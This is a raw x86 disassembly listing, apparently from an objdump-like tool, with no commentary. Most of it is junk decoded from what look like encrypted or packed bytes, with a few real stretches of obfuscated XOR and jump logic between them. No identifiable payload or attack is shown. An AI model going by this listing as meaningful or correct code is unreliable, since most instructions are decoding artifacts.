  40bd08:	inc    ecx
  40bd09:	out    dx,al
  40bd0a:	cdq    
  40bd0b:	stos   DWORD PTR es:[edi],eax
  40bd0c:	push   es
  40bd0d:	xchg   DWORD PTR ds:0xe91b1f20,edi
  40bd13:	call   0xf7ab:0x4dd73e92
  40bd1a:	imul   edi,DWORD PTR [edx],0x16
  40bd1d:	call   0x47644316
  40bd22:	inc    eax
  40bd23:	adc    al,0x45
  40bd25:	xchg   esp,eax
  40bd26:	jmp    0x55608364
  40bd2b:	mov    ecx,0x7333e98d
  40bd30:	push   0x8f4bdbb0
  40bd35:	add    edx,ebx
  40bd37:	cmp    DWORD PTR [eax+ebx*1+0x55],ebp
  40bd3b:	jb     0x40bcd0
  40bd3d:	mov    ebx,0x8b238a5d
  40bd42:	add    eax,DWORD PTR cs:[edi-0x500f9ab0]
  40bd49:	retf   
  40bd4a:	rcr    DWORD PTR [ebx-0x3c],cl
  40bd4d:	adc    eax,DWORD PTR [ecx-0x619331f7]
  40bd53:	lods   eax,DWORD PTR ds:[esi]
  40bd54:	cmp    al,0x14
  40bd56:	scas   al,BYTE PTR es:[edi]
  40bd57:	xchg   edx,eax
  40bd58:	dec    esp
  40bd59:	gs jp  0x40bd3f
  40bd5c:	or     eax,0xba8ccd65
  40bd61:	sub    eax,0xf3da9460
  40bd66:	cmp    eax,0x1b3532d1
  40bd6b:	mov    eax,ds:0x7923f9d8
  40bd70:	jp     0x40bd78
  40bd72:	dec    esi
  40bd73:	ins    DWORD PTR es:[edi],dx
  40bd74:	daa    
  40bd75:	(bad)  
  40bd76:	popa   
  40bd77:	ffree  st(2)
  40bd79:	xchg   edx,eax
  40bd7a:	inc    ebp
  40bd7b:	call   0x682529cd
  40bd80:	adc    al,0x42
  40bd83:	cmp    DWORD PTR [edx+0x57],edi
  40bd86:	mov    edi,0xdf24ebf8
  40bd8b:	adc    bh,BYTE PTR [ebx+0xb]
  40bd8e:	iret   
  40bd8f:	out    0xfe,eax
  40bd91:	sub    eax,0xa382dfa4
  40bd96:	xchg   ebp,eax
  40bd97:	jge    0x40bd60
  40bd99:	jecxz  0x40bdc8
  40bd9b:	or     ax,0x76ce
  40bd9f:	(bad)  
  40bda0:	push   esi
  40bda1:	mov    ds:0x6a188a2c,eax
  40bda6:	add    esi,DWORD PTR [esp+edi*4-0x2d]
  40bdaa:	mov    ds:0xa086ac78,eax
  40bdaf:	or     DWORD PTR [edi],0x62
  40bdb2:	sbb    al,0xf1
  40bdb4:	jle    0x40bdd4
  40bdb6:	pushf  
  40bdb7:	mov    bl,0x20
  40bdb9:	xor    edi,edx
  40bdbb:	lods   eax,DWORD PTR ds:[esi]
  40bdbc:	fptan  
  40bdbe:	mov    dl,0xb5
  40bdc0:	jecxz  0x40be2c
  40bdc2:	lahf   
  40bdc3:	xor    al,0xa7
  40bdc5:	aas    
  40bdc6:	or     BYTE PTR [esi+ebx*4],ah
  40bdc9:	mov    bl,0xcc
  40bdcb:	loop   0x40bda0
  40bdcd:	inc    ecx
  40bdce:	neg    BYTE PTR [edx-0x2bd3493]
  40bdd4:	mov    ebx,0xc082e5d6
  40bdd9:	and    ebx,edi
  40bddb:	popf   
  40bddc:	push   esi
  40bddd:	lahf   
  40bdde:	call   0xaf35:0x3d72850f
  40bde5:	adc    bh,ch
  40bde7:	cmp    ah,BYTE PTR ds:0x75ccefb2
  40bded:	adc    al,0x2f
  40bdef:	mov    bh,0xc9
  40bdf1:	mov    BYTE PTR [ebx+0x58],cl
  40bdf4:	stos   BYTE PTR es:[edi],al
  40bdf5:	push   ds
  40bdf6:	rcr    BYTE PTR [eax],cl
  40bdf8:	sub    ch,BYTE PTR [edi-0x723a6f77]
  40bdfe:	retf   0x3734
  40be01:	xchg   edx,eax
  40be02:	popf   
  40be03:	std    
  40be04:	jno    0x40be10
  40be06:	xchg   ebp,eax
  40be07:	(bad)  
  40be08:	mov    ebp,0xa1593f38
  40be0d:	mov    edx,0xd94588d5
  40be12:	pushf  
  40be13:	in     al,dx
  40be14:	sub    al,0xa1
  40be16:	and    BYTE PTR [edx+0x2fea7c88],bl
  40be1c:	cmp    al,0x9d
  40be1e:	xchg   ebp,eax
  40be1f:	sub    DWORD PTR [esi+0x4b],esi
  40be22:	cmp    BYTE PTR [edx],dh
  40be24:	mov    dl,0xf4
  40be26:	out    dx,al
  40be27:	xor    eax,0x206ac6c7
  40be2c:	push   0x55
  40be2e:	push   esi
  40be2f:	mov    eax,ss
  40be31:	fidiv  WORD PTR [edx]
  40be33:	push   ebp
  40be34:	mov    esi,0x19046688
  40be39:	push   esi
  40be3a:	test   al,0x99
  40be3c:	lods   eax,DWORD PTR cs:[esi]
  40be3e:	jbe    0x40bea4
  40be40:	ja     0x40be82
  40be42:	es adc dh,dl
  40be45:	and    eax,0x3bde97ea
  40be4a:	fistp  QWORD PTR [eax]
  40be4c:	rcr    DWORD PTR [esi-0xe28a7fb],0x1a
  40be53:	enter  0xadaa,0x89
  40be57:	adc    al,0x8
  40be59:	leave  
  40be5a:	dec    edi
  40be5b:	outs   dx,DWORD PTR ds:[esi]
  40be5c:	push   cs
  40be5d:	add    ch,BYTE PTR [eax-0x30350947]
  40be63:	cmp    bh,bl
  40be65:	in     eax,0x5b
  40be67:	dec    ebx
  40be68:	xor    BYTE PTR [ebp+0xe],0x98
  40be6c:	ja     0x40bedd
  40be6e:	loopne 0x40be84
  40be70:	pop    edi
  40be71:	jecxz  0x40be75
  40be73:	adc    bh,BYTE PTR [edx]
  40be75:	lods   al,BYTE PTR ds:[esi]
  40be76:	es mov ah,0xb0
  40be79:	pop    ds
  40be7a:	dec    esp
  40be7b:	ins    DWORD PTR es:[edi],dx
  40be7c:	inc    esp
  40be7d:	jns    0x40beed
  40be7f:	js     0x40be30
  40be81:	lahf   
  40be82:	pop    ecx
  40be83:	pop    ebp
  40be84:	sbb    BYTE PTR [eax],dl
  40be86:	xor    eax,0xd54d3dd4
  40be8b:	pop    ss
  40be8c:	xor    al,0xba
  40be8e:	sbb    eax,0x57c8973f
  40be93:	add    cl,cl
  40be95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be96:	mov    ch,0x8b
  40be98:	inc    ebp
  40be99:	xor    eax,0x939c9678
  40be9e:	das    
  40be9f:	sti    
  40bea0:	rcr    DWORD PTR [eax],0x7b
  40bea3:	and    dl,ah
  40bea5:	add    ecx,edi
  40bea7:	xor    esi,ecx
  40bea9:	pop    es
  40beaa:	dec    BYTE PTR [ecx]
  40beac:	inc    eax
  40bead:	sbb    ch,BYTE PTR [ebx+0x79]
  40beb0:	ret    0x7c91
  40beb3:	fyl2xp1 
  40beb5:	scas   al,BYTE PTR es:[edi]
  40beb6:	seta   BYTE PTR [ebx+0x4c]
  40beba:	xchg   DWORD PTR ds:0xed7c5515,edi
  40bec0:	loop   0x40bf04
  40bec2:	mov    al,0x61
  40bec4:	dec    ecx
  40bec5:	or     BYTE PTR [ebp-0x2d],ch
  40bec8:	(bad)  
  40bec9:	out    0x32,al
  40becb:	daa    
  40becc:	xchg   esi,eax
  40becd:	jne    0x40bec3
  40becf:	mov    ch,0x5d
  40bed1:	or     esp,DWORD PTR [ebx-0x18e880d0]
  40bed7:	(bad)  
  40bed8:	xor    ch,BYTE PTR [ebx-0x577c49f4]
  40bede:	sbb    DWORD PTR [esi+0x1e],ecx
  40bee1:	jmp    0xcb8692de
  40bee6:	fnsave ds:0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x389d8acf]
  40bf27:	stc    
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf60
  40bf31:	mov    dh,0x4c
  40bf33:	pop    eax
  40bf34:	jnp    0x40bf77
  40bf36:	lods   eax,DWORD PTR ds:[esi]
  40bf37:	mov    ecx,ebp
  40bf39:	adc    DWORD PTR [edx+0x2eea3bf4],0x3299db1c
  40bf43:	dec    edx
  40bf44:	dec    ebp
  40bf45:	mov    cx,0x67b
  40bf49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf4a:	and    al,0xb5
  40bf4c:	aam    0x76
  40bf4e:	add    eax,0x16c2b23
  40bf53:	stos   BYTE PTR es:[edi],al
  40bf54:	inc    edi
  40bf55:	xchg   edx,eax
  40bf56:	pop    esp
  40bf57:	cdq    
  40bf58:	mov    ah,0xa6
  40bf5a:	add    eax,0xce48194d
  40bf5f:	stc    
  40bf60:	imul   ebx,DWORD PTR [edx+eiz*1],0x53
  40bf64:	or     al,0x7c
  40bf66:	sub    DWORD PTR [ebp+ecx*2-0x4330c32a],esp
  40bf6d:	leave  
  40bf6e:	jecxz  0x40bf05
  40bf70:	test   DWORD PTR [ecx+edi*8+0x22],edi
  40bf74:	jo     0x40bf6d
  40bf76:	pop    ds
  40bf77:	mov    bh,0x5b
  40bf79:	call   0xfd68:0x33c337d0
  40bf80:	gs loop 0x40bf5b
  40bf83:	mov    bh,0xe7
  40bf85:	mov    cl,0x33
  40bf87:	xor    eax,0x27d51de1
  40bf8c:	pop    edx
  40bf8d:	imul   edx,DWORD PTR [ebx],0xffffff8c
  40bf90:	or     BYTE PTR [ebx+0xf],dl
  40bf93:	mov    dl,dl
  40bf95:	shl    BYTE PTR [ebp+0x299e2ff2],1
  40bf9b:	cmp    ebx,DWORD PTR [esp+eax*1+0x75]
  40bf9f:	hlt    
  40bfa0:	scas   al,BYTE PTR es:[edi]
  40bfa1:	or     BYTE PTR [ebx],cl
  40bfa3:	adc    DWORD PTR [ebx],eax
  40bfa5:	sub    BYTE PTR [ebx],ch
  40bfa7:	cmc    
  40bfa8:	sub    al,0x3e
  40bfaa:	loop   0x40bf32
  40bfac:	mov    bl,0x24
  40bfae:	(bad)  
  40bfaf:	(bad)  
  40bfb0:	sub    bl,bl
  40bfb2:	jns    0x40bf59
  40bfb4:	out    dx,al
  40bfb5:	dec    DWORD PTR [ecx+0xe]
  40bfb8:	add    dh,BYTE PTR [esp]
  40bfbb:	inc    ebp
  40bfbc:	adc    al,BYTE PTR [edi]
  40bfbe:	or     al,0xec
  40bfc0:	dec    edx
  40bfc1:	sub    eax,0xbc030bd5
  40bfc6:	push   ebx
  40bfc7:	js     0x40bfd4
  40bfc9:	call   0x5659:0x1d4afffd
  40bfd0:	mov    esi,0xcefa8467
  40bfd5:	mov    eax,ds:0x34ec3d11
  40bfda:	adc    ebx,DWORD PTR [edi]
  40bfdc:	aam    0xf5
  40bfde:	test   eax,0xe40763da
  40bfe3:	aad    0x96
  40bfe5:	sbb    DWORD PTR [edi],eax
  40bfe7:	imul   ecx,DWORD PTR [ecx-0x2806a82b],0xffffffc3
  40bfee:	out    dx,eax
  40bfef:	dec    edx
  40bff0:	xchg   ebp,eax
  40bff1:	dec    edx
  40bff2:	je     0x40bfb9
  40bff4:	fistp  QWORD PTR [edi]
  40bff6:	test   DWORD PTR [eax-0x9f3e18d],eax
  40bffc:	retf   
  40bffd:	(bad)  
  40bffe:	ds jmp 0xa5ad62d0
  40c004:	rol    DWORD PTR [esi-0x307a3721],1
  40c00a:	sub    esp,DWORD PTR [eax]
  40c00c:	xor    DWORD PTR [esi-0xfc39a2],0xffffffbc
  40c013:	ss xchg ebx,eax
  40c015:	lods   al,BYTE PTR ds:[esi]
  40c016:	or     ecx,DWORD PTR [edx+0x2781a565]
  40c01c:	lock les edx,FWORD PTR [ebp-0x5d930c7e]
  40c023:	arpl   cx,sp
  40c025:	fdivr  QWORD PTR [ecx]
  40c027:	or     DWORD PTR [ecx+0x30],ebp
  40c02a:	add    eax,0x37444a7d
  40c02f:	out    0x2e,eax
  40c031:	test   DWORD PTR [ecx],ecx
  40c033:	fnstenv [edi]
  40c035:	mov    ecx,0x9533d613
  40c03a:	in     eax,0x64
  40c03c:	adc    bl,BYTE PTR ds:0xd08afe2f
  40c042:	(bad)  
  40c043:	ins    DWORD PTR es:[edi],dx
  40c044:	mov    edi,0x63155134
  40c049:	push   edi
  40c04a:	sbb    BYTE PTR [edi-0x7e],ch
  40c04d:	enter  0x3bbf,0xd0
  40c051:	inc    esi
  40c052:	in     eax,0x4e
  40c054:	pop    esp
  40c055:	mov    dl,0xf7
  40c057:	int3   
  40c058:	outs   dx,BYTE PTR ds:[esi]
  40c059:	scas   eax,DWORD PTR es:[edi]
  40c05a:	outs   dx,DWORD PTR ds:[esi]
  40c05b:	sub    eax,0x79caaa6d
  40c060:	sahf   
  40c061:	scas   al,BYTE PTR es:[edi]
  40c062:	jle    0x40c087
  40c064:	mov    cl,0x96
  40c066:	inc    ebx
  40c067:	lea    esi,[edx+0x6e62d740]
  40c06d:	pop    ds
  40c06e:	xlat   BYTE PTR ds:[ebx]
  40c06f:	dec    esp
  40c070:	sbb    DWORD PTR [ecx+0x3af44fa3],esp
  40c076:	scas   eax,DWORD PTR es:[edi]
  40c077:	mov    ?,WORD PTR ds:[esi-0x36]
  40c07b:	daa    
  40c07c:	sbb    cl,BYTE PTR [esi-0x4d]
  40c07f:	inc    dl
  40c081:	push   esp
  40c082:	add    DWORD PTR [esi*8-0x10370665],ebx
  40c089:	cmp    eax,0xe979fe08
  40c08e:	dec    esp
  40c08f:	pop    ss
  40c090:	push   ecx
  40c091:	in     al,dx
  40c092:	inc    ebp
  40c093:	jae    0x40c112
  40c095:	sbb    eax,0x3bc82c20
  40c09a:	(bad)  
  40c09b:	in     al,dx
  40c09c:	fcmovnbe st,st(4)
  40c09e:	adc    bh,cl
  40c0a0:	jmp    0xf006684d
  40c0a5:	mov    al,0xc4
  40c0a7:	xchg   BYTE PTR [ebx+eax*1],ch
  40c0aa:	sub    BYTE PTR [edi],ah
  40c0ac:	jmp    0x40c04d
  40c0ae:	jne    0x40c0a5
  40c0b0:	cmc    
  40c0b1:	frstor [esi-0x395f1406]
  40c0b7:	sbb    bh,bh
  40c0b9:	jecxz  0x40c0b0
  40c0bb:	neg    DWORD PTR [ecx-0x7f35754f]
  40c0c1:	cdq    
  40c0c2:	retf   0x9aa4
  40c0c5:	jo     0x40c12f
  40c0c7:	clc    
  40c0c8:	stos   DWORD PTR es:[edi],eax
  40c0c9:	adc    edi,DWORD PTR [ecx-0x5d0df20d]
  40c0cf:	loop   0x40c07c
  40c0d1:	fldcw  WORD PTR ds:[ebp-0x19]
  40c0d5:	lods   eax,DWORD PTR ds:[esi]
  40c0d6:	sbb    ecx,DWORD PTR [ebx-0x3bc17951]
  40c0dc:	ss pushw 0x47
  40c0e0:	test   al,0xb1
  40c0e2:	fcomp  DWORD PTR [eax+0xa]
  40c0e5:	push   0xffffffbc
  40c0e7:	push   ecx
  40c0e8:	enter  0x5298,0x2a
  40c0ec:	stc    
  40c0ed:	mov    ebp,0x21ccec5e
  40c0f3:	fisubr WORD PTR [edi]
  40c0f5:	mov    edx,0xb5c7cb11
  40c0fa:	lock adc ah,BYTE PTR [ecx]
  40c0fd:	pop    ebp
  40c0fe:	push   edi
  40c0ff:	adc    eax,0x142fbd78
  40c104:	and    al,0x5b
  40c106:	pop    edi
  40c107:	add    al,BYTE PTR [ecx+edi*2-0x26c3efb2]
  40c10e:	pop    esi
  40c10f:	lods   eax,DWORD PTR ds:[esi]
  40c110:	dec    ebp
  40c111:	push   ebx
  40c112:	aam    0xb8
  40c114:	ja     0x40c171
  40c116:	outs   dx,DWORD PTR ds:[esi]
  40c117:	paddusw mm1,mm2
  40c11a:	(bad)  
  40c11c:	in     al,0x1d
  40c11e:	(bad)  
  40c11f:	adc    eax,0xaba178c3
  40c124:	mov    edx,0x60531e70
  40c129:	mov    ch,0x83
  40c12b:	sub    BYTE PTR [esi+0x60],cl
  40c12e:	inc    ebx
  40c12f:	push   ebp
  40c130:	inc    edi
  40c131:	push   ss
  40c132:	cmp    eax,0xb0545af6
  40c137:	imul   ebx,DWORD PTR [edx-0x9c1b473],0xffffffbb
  40c13e:	mov    ecx,fs
  40c140:	inc    ecx
  40c141:	jno    0x40c0dc
  40c143:	sub    eax,0xc7af53ad
  40c148:	ja     0x40c0d7
  40c14a:	shl    bl,0xa5
  40c14d:	sbb    al,0x7f
  40c14f:	mov    ecx,0x2f74e17e
  40c154:	rcr    BYTE PTR [eax],1
  40c156:	ret    0xe1bb
  40c159:	cmp    esp,DWORD PTR [esi-0x3f]
  40c15c:	(bad)  
  40c15d:	out    dx,eax
  40c15e:	xor    dh,ch
  40c160:	aad    0xf5
  40c162:	loope  0x40c0f4
  40c164:	push   ebx
  40c165:	js     0x40c1c9
  40c167:	mov    dl,0x4e
  40c169:	mov    esi,0xe6957fc7
  40c16e:	in     al,0xbf
  40c170:	test   BYTE PTR ds:0x3c5e37a4,0x87
  40c177:	retf   
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xfb
  40c196:	in     al,0x5
  40c198:	stc    
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	stos   DWORD PTR es:[edi],eax
  40c1a2:	fs jl  0x40c1d1
  40c1a5:	xor    bh,BYTE PTR [ebx-0x44a7b8a2]
  40c1ab:	ret    0xd609
  40c1ae:	les    edi,FWORD PTR [eax+edi*2]
  40c1b1:	xor    al,0x62
  40c1b3:	ins    BYTE PTR es:[edi],dx
  40c1b4:	xor    ecx,DWORD PTR ss:[ebx+edx*2]
  40c1b8:	cwde   
  40c1b9:	data16 ins BYTE PTR es:[edi],dx
  40c1bb:	call   0x714e:0x761e3856
  40c1c2:	int    0x21
  40c1c4:	mov    esp,0x94b94b1b
  40c1c9:	fsub   DWORD PTR [esi+esi*2+0x4d606e9f]
  40c1d0:	fs std 
  40c1d2:	retf   
  40c1d3:	cmp    BYTE PTR [eax],0xc8
  40c1d6:	sbb    BYTE PTR [eax],cl
  40c1d8:	js     0x40c218
  40c1da:	mov    edi,0xfc9dc459
  40c1df:	call   0x52c3:0xfef75f46
  40c1e6:	dec    ecx
  40c1e7:	loopne 0x40c198
  40c1e9:	into   
  40c1ea:	or     esp,ebp
  40c1ec:	xchg   ebx,eax
  40c1ed:	loop   0x40c1aa
  40c1ef:	add    cl,al
  40c1f1:	sbb    ebx,DWORD PTR [edx]
  40c1f3:	loopne 0x40c226
  40c1f5:	xchg   ebp,eax
  40c1f6:	sbb    DWORD PTR [edx+ecx*8+0x6da7d2af],ebx
  40c1fd:	sbb    ebp,ecx
  40c1ff:	repz mov ds:0x498911a3,eax
  40c205:	shl    DWORD PTR [ebp-0x3a],1
  40c208:	adc    al,BYTE PTR [eax-0x19]
  40c20b:	(bad)  
  40c20c:	cs in  eax,0x6a
  40c20f:	fmul   DWORD PTR [ecx]
  40c211:	xchg   ecx,eax
  40c212:	test   eax,0x684ed8d7
  40c217:	aam    0xb9
  40c219:	jge    0x40c1ff
  40c21b:	dec    edi
  40c21c:	adc    BYTE PTR [edi+0x208725c4],0xf0
  40c223:	jle    0x40c23f
  40c225:	cmp    eax,ecx
  40c227:	clc    
  40c228:	or     ch,bl
  40c22a:	(bad)  
  40c22b:	mov    tr2,ecx
  40c22e:	xchg   ebx,eax
  40c22f:	sub    eax,0xdd2c643a
  40c234:	in     al,0xb8
  40c236:	jns    0x40c256
  40c238:	shr    bh,1
  40c23a:	dec    eax
  40c23b:	pop    ss
  40c23c:	push   0x101cd6d4
  40c241:	cli    
  40c242:	out    0xb4,al
  40c244:	pop    ds
  40c245:	push   ebp
  40c246:	retf   0xbaf4
  40c249:	iret   
  40c24a:	dec    esi
  40c24b:	mov    ah,0x9d
  40c24d:	and    DWORD PTR [bp-0x5178],ebx
  40c252:	sub    ch,BYTE PTR [esi-0x5f]
  40c255:	je     0x40c1e1
  40c257:	(bad)  
  40c258:	cmp    BYTE PTR [ebx-0x379ee0a8],dh
  40c25e:	iret   
  40c25f:	outs   dx,BYTE PTR ds:[esi]
  40c260:	lods   eax,DWORD PTR ds:[esi]
  40c261:	test   al,bl
  40c263:	dec    ecx
  40c264:	dec    eax
  40c265:	pop    ebx
  40c266:	mov    ebx,0xa926d5e9
  40c26b:	repnz and DWORD PTR [ebx+eax*8+0x69],ebx
  40c270:	pop    ds
  40c271:	adc    eax,0x4eb7f770
  40c276:	mov    WORD PTR [eax],ss
  40c278:	pop    ecx
  40c279:	inc    ebx
  40c27a:	jg     0x40c268
  40c27c:	stos   BYTE PTR es:[edi],al
  40c27d:	add    DWORD PTR [eax-0x2d98a533],edi
  40c283:	idiv   BYTE PTR [edi-0x5176ae3b]
  40c289:	cli    
  40c28a:	jp     0x40c24a
  40c28c:	mov    edx,0x3648be04
  40c291:	xor    BYTE PTR [edx+0x36],bl
  40c294:	jo     0x40c2dc
  40c296:	xor    DWORD PTR [edi+0x6f],ebx
  40c299:	iret   
  40c29a:	xchg   ecx,eax
  40c29b:	test   eax,0xcf330a52
  40c2a0:	push   DWORD PTR [esp+ecx*4-0x33]
  40c2a4:	sub    BYTE PTR [ebx+0x4f],dh
  40c2a7:	jl     0x40c2b5
  40c2a9:	mov    bh,cl
  40c2ab:	out    0x2d,eax
  40c2ad:	xor    dl,ch
  40c2af:	dec    eax
  40c2b0:	or     edx,DWORD PTR [edi+0x13]
  40c2b3:	cmp    BYTE PTR [eax-0x79353b2d],bh
  40c2b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ba:	adc    DWORD PTR [ecx],esi
  40c2bc:	test   eax,0x2af3e80
  40c2c1:	add    edi,DWORD PTR ss:[esi-0x182bff37]
  40c2c8:	daa    
  40c2c9:	cmp    edi,DWORD PTR [edx+esi*8-0x5c]
  40c2cd:	xchg   edi,eax
  40c2ce:	push   esi
  40c2cf:	mov    edx,0x48b88a9
  40c2d4:	scas   al,BYTE PTR es:[edi]
  40c2d5:	dec    ebp
  40c2d6:	adc    al,0xd4
  40c2d8:	push   ebp
  40c2d9:	jp     0x40c2a0
  40c2db:	int    0xca
  40c2dd:	retf   
  40c2de:	xchg   dh,ch
  40c2e0:	mov    WORD PTR [edx+0x3a],ss
  40c2e3:	mov    al,BYTE PTR [edx-0x458af69d]
  40c2e9:	mov    edi,0x9107532e
  40c2ee:	inc    edx
  40c2ef:	sahf   
  40c2f0:	xlat   BYTE PTR ds:[ebx]
  40c2f1:	or     bh,dl
  40c2f3:	int    0x2e
  40c2f5:	xlat   BYTE PTR ds:[ebx]
  40c2f6:	loope  0x40c34a
  40c2f8:	fidivr DWORD PTR [edi+ebx*2+0x31]
  40c2fc:	jae    0x40c2b3
  40c2fe:	jne    0x40c339
  40c300:	xor    al,0x1f
  40c302:	pop    es
  40c303:	inc    esp
  40c305:	stos   DWORD PTR es:[edi],eax
  40c306:	enter  0xb1b6,0x4c
  40c30a:	xor    esi,esp
  40c30c:	dec    ebp
  40c30d:	jnp    0x40c2ce
  40c30f:	mov    dl,0x95
  40c311:	sub    DWORD PTR [ebx],edx
  40c313:	lods   al,BYTE PTR ds:[esi]
  40c314:	std    
  40c315:	mov    cl,0x2b
  40c317:	daa    
  40c318:	jno    0x40c2ed
  40c31a:	retf   0x71fc
  40c31d:	(bad)  
  40c31e:	cmp    cl,BYTE PTR [esi]
  40c320:	push   cs
  40c321:	jmp    0xbc0049
  40c326:	jae    0x40c383
  40c328:	and    BYTE PTR [edx+0x1a],dh
  40c32b:	sbb    al,BYTE PTR [ecx]
  40c32d:	or     bh,dh
  40c32f:	shl    esp,0x97
  40c332:	ja     0x40c337
  40c334:	xchg   ecx,eax
  40c335:	cmc    
  40c336:	inc    esi
  40c337:	mov    ch,0xc8
  40c339:	push   esp
  40c33a:	push   esp
  40c33b:	sbb    al,0x4f
  40c33d:	or     edi,edi
  40c33f:	repz push ebp
  40c341:	dec    edx
  40c342:	call   0x41880feb
  40c347:	fisttp DWORD PTR [ecx]
  40c349:	or     DWORD PTR [esi],0xffffff91
  40c34c:	repnz mov ebx,0xcf2fe668
  40c352:	pop    eax
  40c353:	fldenv [edi-0x48d659a0]
  40c359:	stc    
  40c35a:	loopne 0x40c349
  40c35c:	call   0x38ded17f
  40c361:	jmp    0x8c0423a8
  40c366:	fcom   QWORD PTR [edi-0x22]
  40c369:	shl    BYTE PTR [edx],0x37
  40c36c:	push   esp
  40c36d:	fwait
  40c36e:	test   al,0x2d
  40c370:	xchg   edi,eax
  40c371:	pop    edi
  40c372:	fidiv  DWORD PTR [esi]
  40c374:	push   edx
  40c375:	adc    eax,0xaff7c7f7
  40c37b:	test   eax,0xbd77603a
  40c380:	retf   
  40c381:	or     cl,al
  40c383:	and    ch,ch
  40c385:	jns    0x40c37c
  40c387:	(bad)  
  40c388:	in     eax,0x70
  40c38a:	into   
  40c38b:	repz fxam 
  40c38e:	mov    ah,0x8d
  40c390:	mov    ah,0xec
  40c392:	push   cs
  40c393:	sbb    DWORD PTR [edx-0x42bbd467],esi
  40c399:	shr    esp,0x70
  40c39c:	mov    DWORD PTR [ecx+0x15730a3a],esp
  40c3a2:	pop    ss
  40c3a3:	pop    edi
  40c3a4:	sbb    edx,DWORD PTR [eax+0x2e]
  40c3a7:	fcomp  QWORD PTR [ecx+0x3b9748ea]
  40c3ad:	je     0x40c335
  40c3af:	xchg   ebp,eax
  40c3b0:	mov    ah,0x54
  40c3b2:	adc    eax,0x9f25845
  40c3b7:	imul   edi,DWORD PTR [ebx+0x3f],0x6d1b6a3b
  40c3be:	jmp    FWORD PTR [ebx]
  40c3c0:	es jecxz 0x40c3c9
  40c3c3:	ds jp  0x40c408
  40c3c6:	sbb    BYTE PTR [esi],0x20
  40c3c9:	(bad)  
  40c3ca:	add    DWORD PTR [ecx-0x4568311],ebx
  40c3d0:	push   ebx
  40c3d1:	int3   
  40c3d2:	dec    edx
  40c3d3:	and    eax,0x7e8e13a2
  40c3d8:	call   0xf9631cdc
  40c3dd:	cli    
  40c3de:	sub    dh,BYTE PTR [esi]
  40c3e0:	hlt    
  40c3e1:	mov    ebp,0xd57c84f7
  40c3e6:	fisttp QWORD PTR [ebx+0x54b9fc45]
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [ecx],cl
  40c447:	xor    DWORD PTR [ebp+0x7e8214b7],esp
  40c44d:	jle    0x40c487
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c43e
  40c453:	sub    al,0x51
  40c455:	push   esi
  40c456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c457:	test   al,0xe9
  40c459:	cmp    al,0x3c
  40c45b:	sbb    al,0xe2
  40c45d:	daa    
  40c45e:	mov    ebx,0x74d017a6
  40c464:	or     DWORD PTR [ebp-0x35],eax
  40c467:	inc    ebx
  40c468:	(bad)  
  40c469:	fidivr DWORD PTR [ecx-0x66]
  40c46c:	adc    ebx,DWORD PTR ds:[edi]
  40c46f:	enter  0xfca2,0xd
  40c473:	mov    ebp,0x83a20026
  40c478:	out    dx,al
  40c479:	and    al,0x7a
  40c47b:	jmp    0x76f1c3ea
  40c480:	lea    eax,[edi+0x37]
  40c483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c484:	xchg   esp,eax
  40c485:	or     ebp,eax
  40c487:	mov    dl,0x4
  40c489:	and    al,dh
  40c48b:	jb     0x40c4c7
  40c48d:	adc    BYTE PTR [ebp+0x10c5b399],ah
